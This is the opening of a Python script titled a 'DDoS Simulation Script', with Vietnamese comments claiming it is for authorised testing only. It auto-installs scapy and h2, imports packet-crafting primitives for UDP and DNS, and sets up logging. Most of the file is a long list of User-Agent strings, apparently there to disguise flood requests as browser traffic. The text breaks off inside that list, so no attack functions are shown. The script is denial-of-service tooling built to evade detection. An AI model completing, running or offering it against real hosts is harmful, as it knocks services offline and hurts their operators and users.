#!/usr/bin/env python3
"""
DDoS Simulation Script (Chỉ dùng cho mục đích kiểm thử trong môi trường được phép)
Cải tiến: Cấu trúc code rõ ràng, tối ưu quản lý các luồng, báo cáo thống kê và handle lỗi.
"""

import importlib
import subprocess
import sys
import requests
import threading
import time
import random
import string
import logging
import json
import socket
import re
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# ------------------------------
# Cài đặt các thư viện cần thiết
# ------------------------------
def install_package(package):
    try:
        importlib.import_module(package)
        logging.info(f"Package {package} already installed")
    except ImportError:
        logging.info(f"Installing package {package}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            logging.info(f"Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to install {package}: {e}")
            sys.exit(1)

required_packages = ["requests", "scapy", "h2"]
for pkg in required_packages:
    install_package(pkg)

# Nhập module sau khi cài đặt
from scapy.all import send, IP, UDP, Raw, DNS, DNSQR  
import http.client
import ssl

# ------------------------------
# Cấu hình Logging
# ------------------------------
logging.basicConfig(
    filename='ddos_simulation.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ------------------------------
# Cấu hình danh sách User-Agent và Accept Headers
# ------------------------------
# Danh sách 200 User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.91 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Tablet; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Android 11; Mobile; LG-M255) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/111.0.1661.62 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.154 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Android 12; Mobile; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/105.0.1343.27 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Tablet; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/99.0.1150.46 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Android 12; Mobile; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.52 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; SM-T580) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
    "Mozilla/5.0 (Android 10; Mobile; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/86.0.622.69 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/79.0.309.43 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 9; Mobile; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E277 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 10_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1",
    "Mozilla/5.0 (Android 8.0.0; Mobile; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E233 Safari/601.1",
    "Mozilla/5.0 (Linux; Android 4.4.4; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3_9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/17.17134 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1",
    "Mozilla/5.0 (Android 7.0; Mobile; SM-G930V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Linux; Android 6.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.16299 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
    "Mozilla/5.0 (Android 5.0.2; SM-G900I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
    "Mozilla/5.0 (Linux; Android 4.3; SM-G900P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
    "Mozilla/5.0 (Android 4.2.2; SM-G900H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 8_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B144 Safari/8536.25",
    "Mozilla/5.0 (Linux; Android 4.1.2; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/14.14393 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A406 Safari/8536.25",
    "Mozilla/5.0 (Android 4.0.4; SM-G900I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 6_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
    "Mozilla/5.0 (Linux; Android 3.2.6; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 5_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/13.10586 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3",
    "Mozilla/5.0 (Android 2.3.7; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 4_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 4_3 like Mac OS X) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
    "Mozilla/5.0 (Linux; Android 2.2.3; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 3_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.10240 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 4_2 like Mac OS X) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (Android 2.1-update1; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 2_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 3_2 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Linux; Android 1.6; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 1_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/11.9600 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android 1.5; SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.9 (KHTML, like Gecko) Safari/312.6",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.36",
    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_2 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20",
    "Mozilla/5.0 (Linux; U; Android 1.1; en-us; dream) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.36",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10",
    "Mozilla/5.0 (Android; U; Android; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
